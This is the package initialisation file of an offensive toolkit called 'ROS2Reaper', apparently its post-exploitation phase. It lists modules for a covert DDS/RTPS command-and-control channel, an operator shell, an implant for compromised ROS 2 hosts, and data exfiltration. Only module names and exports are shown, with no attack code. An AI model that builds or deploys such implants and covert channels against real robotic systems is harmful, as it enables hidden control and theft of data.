"""
ROS2Reaper Phase 4 — Post-Exploitation / C2
=============================================

Modules:
    c2_channel  — Covert DDS/RTPS command-and-control channel
    c2_server   — Operator C2 server and interactive shell
    c2_beacon   — Implant deployed on compromised ROS 2 hosts
    c2_exfil    — Data exfiltration over the covert channel

All Phase 4 modules operate at the raw UDP/RTPS level — no ROS 2 dependency
required on the operator side.
"""

from .c2_channel import C2Transport, C2Packet, C2Session, MsgType
from .c2_server  import C2Server, C2Shell, run_server
from .c2_beacon  import C2Beacon, run_beacon
from .c2_exfil   import C2Exfiltrator, ExfilReceiver, run_exfil, run_exfil_receive

__all__ = [
    "C2Transport", "C2Packet", "C2Session", "MsgType",
    "C2Server", "C2Shell", "run_server",
    "C2Beacon", "run_beacon",
    "C2Exfiltrator", "ExfilReceiver", "run_exfil", "run_exfil_receive",
]
